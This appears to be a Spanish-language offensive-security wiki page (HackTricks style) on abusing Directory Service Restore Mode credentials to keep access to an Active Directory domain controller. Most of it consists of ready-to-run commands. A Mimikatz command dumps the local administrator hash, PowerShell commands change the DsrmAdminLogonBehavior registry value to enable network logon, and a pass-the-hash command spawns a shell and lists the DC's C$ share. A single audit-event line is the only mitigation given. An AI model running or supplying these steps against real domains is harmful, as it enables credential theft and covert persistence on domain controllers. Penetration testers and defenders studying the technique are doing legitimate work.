# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Hay una cuenta de **administrador local** dentro de cada **DC**. Si tienes privilegios de administrador en esta máquina, puedes usar mimikatz para **dump** del **hash del administrador local**. Después, modificando un registro para **activar esta contraseña**, podrás acceder remotamente a este usuario Administrador local.\
Primero necesitamos hacer **dump** del **hash** del usuario **Administrador local** dentro del DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Entonces debemos comprobar si esa cuenta funcionará y, si la clave del registro tiene el valor "0" o no existe, debes **establecerla en "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Luego, usando un PTH, puedes **listar el contenido de C$ o incluso obtener una shell**. Ten en cuenta que, para crear una nueva sesión de PowerShell con ese hash en memoria (para el PTH), **el "dominio" utilizado es solo el nombre de la máquina DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Más información sobre esto en: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) y [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Mitigación

- Event ID 4657 - Auditar la creación/cambio de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Referencias

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
